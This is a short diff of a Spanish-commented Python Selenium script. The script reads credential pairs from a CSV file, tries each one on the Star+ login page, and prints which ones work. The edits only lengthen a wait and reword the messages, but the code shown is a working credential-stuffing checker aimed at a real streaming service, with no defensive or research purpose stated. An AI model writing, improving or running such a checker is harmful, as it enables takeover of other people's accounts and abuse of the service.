@@ -16,7 +16,7 @@ with open('csv/data_starplus.csv', 'r') as csv_file:
 
             driver.get('https://www.starplus.com/es-419/login')
 
-            time.sleep(2)
+            time.sleep(5)
             username_field = driver.find_element(By.NAME, 'email')
             username_field.send_keys(line[0])
 
@@ -30,9 +30,9 @@ with open('csv/data_starplus.csv', 'r') as csv_file:
             submit = driver.find_element(By.XPATH, '/html/body/div[1]/div/div[4]/div/main/div/form/div/button')
             submit.click()
             time.sleep(2)
-            print(f"Las credenciales {line} funcionan")
+            print(f"Las credenciales {line} , funcionan correctamente")
         except NoSuchElementException:
-            print(f"Las credenciales {line} no funcionan. Intentando con el siguiente conjunto.")
+            print(f"Las credenciales {line} no funcionan... Intentando con el siguiente conjunto.")
         finally:
             # Cerrar el navegador en cualquier caso
             driver.quit()
